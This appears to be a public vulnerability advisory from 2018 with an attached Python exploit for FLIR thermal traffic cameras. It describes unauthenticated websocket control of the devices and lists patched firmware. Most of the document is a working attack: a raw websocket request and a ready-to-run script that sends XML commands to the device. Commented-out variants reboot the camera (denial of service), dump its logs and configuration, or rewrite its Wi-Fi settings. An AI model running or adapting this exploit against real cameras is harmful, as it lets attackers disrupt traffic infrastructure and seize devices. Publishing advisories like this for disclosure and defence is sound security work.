@@ -1,0 +1,206 @@
+# Title: FLIR Thermal Traffic Cameras 1.01-0bb5b27 - Information Disclosure
+# Author: Gjoko 'LiquidWorm' Krstic
+# Date: 2018-10-06
+# Vendor: FLIR Systems, Inc.
+# Link: https://www.flir.com
+# Tested on: nginx/1.12.1, nginx/1.10.2, nginx/1.8.0, Websocket/13 (RFC 6455)
+# Affected firmware version: V1.01-0bb5b27 (TrafiOne)     Codename: TrafiOne
+#                            E1.00.09      (TI BPL2 EDGE) Codename: TIIP4EDGE
+#                            V1.02.P01     (TI x-stream)  Codename: TIIP2
+#                            V1.05.P01     (ThermiCam)    Codename: ThermiCam
+#                            V1.04.P02     (ThermiCam)    Codename: ThermiCam
+#                            V1.04         (ThermiCam)    Codename: ThermiCam
+#                            V1.01.P02     (ThermiCam)    Codename: ThermiCam
+#                            V1.05.P03     (TrafiSense)   Codename: TrafiSense
+#                            V1.06         (VIP-IP)       Codename: VIP-IP
+#                            V1.02.P02     (TrafiRadar)   Codename: TrafiRadar
+#
+# Vendor patched firmware version:
+#
+# Product name                Firmware      Released 
+# ----------------------------------------------------
+# ThermiCam / TrafiSense      E1.06.03      17.09.2018
+# TI BPL2 EDGE                V1.00         17.09.2018
+# TI x-stream                 E1.03.02      17.09.2018
+# TrafiOne                    E1.02.02      17.09.2018
+# ----------------------------------------------------
+#
+# Advisory ID: ZSL-2018-5490
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5490.php
+# Vendor firmware updates: https://www.flir.com/security/best-practices-for-cybersecurity/
+# Vendor cyber hardening guide: https://www.flir.com/globalassets/security/flir-pro-security-cyber-hardening-guide.pdf
+
+# Desc: FLIR thermal traffic cameras suffer from an unauthenticated device manipulation
+# vulnerability utilizing the websocket protocol. The affected FLIR Intelligent
+# Transportation Systems - ITS models use an insecure implementation of websocket
+# communication used for administering the device. Authentication and authorization
+# bypass via referencing a direct object allows an attacker to directly modify running
+# configurations, disclose information or initiate a denial of service (DoS) scenario
+# with Reboot command. The devices do not support the usage of TLS 'wss://' prefix for
+# WebSocket Secure connection making the network traffic disclosed in plain-text to
+# MitM evil-doers. Also, the web service has an Origin validation security issue and
+# is vulnerable to Cross-Site WebSocket Hijacking (CSWSH).
+#
+# ---
+# Request:
+#
+# GET ws://192.168.1.1:13042/ws/xml2 HTTP/1.1
+# Host: 192.168.1.1:13042
+# Connection: Upgrade
+# Pragma: no-cache
+# Cache-Control: no-cache
+# User-Agent: Bond/00.7
+# Upgrade: websocket
+# Origin: zeroscience.mk:1337
+# Sec-WebSocket-Version: 13
+# Accept-Encoding: gzip, deflate
+# Accept-Language: en-US,en;q=0.9
+# Cookie: tmhDynamicLocale.locale=%22en%22
+# Sec-WebSocket-Key: A5SH9PRtc3rYF49kKO4vmw==
+# Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
+#
+# Response:
+#
+# HTTP/1.1 101 Switching Protocols
+# Server: nginx/1.10.2
+# Date: Mon, 13 Aug 2018 02:48:46 GMT
+# Content-Length: 0
+# Connection: upgrade
+# Upgrade: WebSocket
+# Sec-WebSocket-Accept: QyXaTdjpCsAyxhVnVqjMg95jepk=
+#
+# ---
+# No HTTP/1.1 401 Unauthorized response observed.
+#
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from websocket import create_connection as t00t
+import time
+import sys
+
+endpoint = "/ws/xml2"
+
+if (len(sys.argv) <= 2):
+    print '[*] Usage: exploit.py <ipaddress> <port>'
+    exit(0)
+
+host = sys.argv[1]
+port = sys.argv[2]
+
+# Supported message types:
+'''
+<Message Type="SupportedMessages">
+<Body>
+	<Message Type="GetMessageConstraints"/>
+	<Message Type="GetSupportedMessages"/>
+	<Message Type="Session"/>
+	<Message Type="Subscription"/>
+	<Message Type="ClearData"/>
+	<Message Type="GetConnectionInformation"/>
+	<Message Type="GetData"/>
+	<Message Type="GetEvents"/>
+	<Message Type="GetLostData"/>
+	<Message Type="GetManagedBy"/>
+	<Message Type="GetPresenceData"/>
+	<Message Type="GetPresenceLevel"/>
+	<Message Type="GetPresenceLevelHistory"/>
+	<Message Type="GetStorageLimits"/>
+	<Message Type="SetConnectionSettings"/>
+	<Message Type="SetManagedBy"/>
+	<Message Type="ClearBootCount"/>
+	<Message Type="ClearHistogram"/>
+	<Message Type="ClearStoredCounter"/>
+	<Message Type="ClearSystemLogs"/>
+	<Message Type="CreateAviSequence"/>
+	<Message Type="DoBadStuff"/> <-- ;]]
+	<Message Type="ForceEvent"/>
+	<Message Type="ForceKeyframe"/>
+	<Message Type="GetBootCount"/>
+	<Message Type="GetBplSettings"/>
+	<Message Type="GetCameraConfiguration"/>
+	<Message Type="GetCameraDefinitions"/>
+	<Message Type="GetCameraSettings"/>
+	<Message Type="GetConfiguration"/>
+	<Message Type="GetConstraints"/>
+	<Message Type="GetCpuStatistics"/>
+	<Message Type="GetDateTime"/>
+	<Message Type="GetDisplayOverlay"/>
+	<Message Type="GetEventLog"/>
+	<Message Type="GetEventsDescription"/>
+	<Message Type="GetFrameFlow"/>
+	<Message Type="GetHardwareInformation"/>
+	<Message Type="GetHardwareSensors"/>
+	<Message Type="GetHistogram"/>
+	<Message Type="GetImage"/>
+	<Message Type="GetImageSharpness"/>
+	<Message Type="GetLeptonSettings"/>
+	<Message Type="GetLoggingActivation"/>
+	<Message Type="GetMemoryStatistics"/>
+	<Message Type="GetNumberOfOutputs"/>
+	<Message Type="GetOpenEvents"/>
+	<Message Type="GetOutputsState"/>
+	<Message Type="GetPermissions"/>
+	<Message Type="GetProductInformation"/>
+	<Message Type="GetSocketInformation"/>
+	<Message Type="GetState"/>
+	<Message Type="GetStoredCounter"/>
+	<Message Type="GetSystemLogs"/>
+	<Message Type="GetTemperature"/>
+	<Message Type="GetThermalQualityHistogram"/>
+	<Message Type="GetThermalQualityReferenceImage"/>
+	<Message Type="GetThreadInformation"/>
+	<Message Type="GetTime"/>
+	<Message Type="GetTranslations"/>
+	<Message Type="GetUpTime"/>
+	<Message Type="GetVersion"/>
+	<Message Type="GetVoltage"/>
+	<Message Type="GetWifiInformation"/>
+	<Message Type="KeepAlive"/>
+	<Message Type="Notify"/>
+	<Message Type="PauseDetectionFramework"/>
+	<Message Type="Reboot"/>
+	<Message Type="SetBplSettings"/>
+	<Message Type="SetCameraConfiguration"/>
+	<Message Type="SetCameraSettings"/>
+	<Message Type="SetConfiguration"/>
+	<Message Type="SetConstraintsFilter"/>
+	<Message Type="SetDateTime"/>
+	<Message Type="SetDisplayOverlay"/>
+	<Message Type="SetHardwareInformation"/>
+	<Message Type="SetLeptonSettings"/>
+	<Message Type="SetLoggingActivation"/>
+	<Message Type="SetTime"/>
+	<Message Type="SetWifiInformation"/>
+	<Message Type="UpdateFrameFlow"/>
+</Body>
+</Message>
+'''
+
+socket = t00t("ws://"+host+":"+port+endpoint)
+
+#print 'Sending Reboot message type (DoS)...'
+#msg = '<Message Type=\"Reboot\"></Message>'
+#print 'Getting supported messages...'
+#msg = '<Message Type=\"GetSupportedMessages\"></Message>'
+#print 'Getting system logs...'
+#msg = '<Message Type=\"GetSystemLogs\"></Message>'
+#print 'Getting device configuration...'
+#msg = '<Message Type=\"GetConfiguration\"></Message>'
+#print 'Setting new Wifi information...'
+#msg ='''
+#<Message Type="SetWifiInformation">
+#    <Body Present="0" SSID="pwned" Channel="11" Hidden="0" Mode="AccessPoint" />
+#</Message>
+#'''
+
+msg = '<Message Type=\"GetProductInformation\"></Message>'
+
+socket.send(msg)
+print 'Message sent.'
+print 'Receiving...'
+time.sleep(2)
+priem =  socket.recv()
+print 'Received data: \n%s' % priem
+socket.close()
